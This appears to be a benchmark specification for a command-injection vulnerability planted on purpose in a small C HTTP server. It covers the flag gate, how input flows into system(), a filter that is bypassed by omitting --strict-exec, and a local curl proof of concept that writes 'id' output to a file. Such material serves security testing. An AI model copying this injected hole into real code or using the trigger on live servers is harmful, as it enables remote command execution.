DESCRIPTION:
  CLI-flag-gated command injection. The server must be started with --exec-mode
  for the vulnerable endpoint to be reachable.
  A user-supplied URL query parameter flows into system() with inadequate sanitization.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard inside accept_request()
              `if (exec_mode && strncmp(url, "/exec", 5) == 0 ...)`
  complexity: one condition, one flag, no struct, no file parsing

INPUT_FLOW (I3 — struct dispatch):
  entry:      HTTP GET /exec?cmd=<payload>  →  url[] (parsed in accept_request())
  path:       accept_request() dispatches to handle_exec()
              handle_exec() stores cmd in exec_args_t struct, calls dispatch_exec()
              dispatch_exec() calls system(args->cmd)
  transforms: one struct indirection — cmd pointer is stored then dereferenced; no transform

SANITIZATION (S3 — strict, bypassable):
  check:   strpbrk(cmd, "|;&`$") check gated by strict_exec flag
           (only active when server started with --strict-exec)
  bypass:  omit --strict-exec when starting the server; the check is never evaluated

SINK:        system() in dispatch_exec() — called via exec_args_t struct from handle_exec() (httpd.c, injected into accept_request / handle_exec)

CHANGED FILES:
  httpd.c — 4 hunks:
    1. globals:          added `exec_mode` and `strict_exec` (S3 only)
    2. send_exec_reply(): new HTTP response helper function
    3. handle_exec():    new function with I3/S3 variant logic
    4. accept_request(): added exec route guard after url[] is read
    5. main():           changed main(void) to main(int argc, char *argv[]) with --port/--exec-mode/--strict-exec parsing

EXPLOIT:
  build:   gcc -o httpd httpd.c -lpthread
  start:   (cd /tmp/poc_009_www && ./httpd --port 18009 --exec-mode)
  trigger: curl 'http://127.0.0.1:18009/exec?cmd=id>/tmp/poc_009_marker'
  verify:  cat /tmp/poc_009_marker
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to return 404 (falls through
               to normal path processing which cannot find the file on disk).

NOTES:

  - system() output goes to the server's stdout/stderr (inherited fds), not the
    HTTP response body. The response body contains only "Command dispatched.".
    Use a write-to-file payload (id>/tmp/poc_009_marker) to confirm blind execution.
  - I3 stores cmd in a struct then passes args->cmd to system(). The indirection
    is cosmetic — no transform or sanitization occurs at the struct boundary.
  - S3's strict check covers |;&`$ but is only evaluated when --strict-exec is
    passed. The exploit omits --strict-exec so the check is never reached.
